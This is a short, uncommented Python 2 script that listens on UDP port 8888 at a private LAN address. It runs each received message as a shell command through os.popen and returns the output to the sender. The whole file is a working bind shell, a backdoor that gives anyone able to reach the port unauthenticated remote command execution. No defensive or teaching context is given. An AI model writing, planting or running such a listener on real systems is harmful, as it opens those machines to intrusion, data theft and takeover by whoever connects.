#!/usr/bin/python2

import socket                   # Import socket module
import os

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

ip="192.168.10.218"
port=8888

s.bind((ip,port))

while True:
	client=s.recvfrom(40)
	cmd=(os.popen(client[0]))
	command=cmd.read()
	print command
	s.sendto(command,client[1])
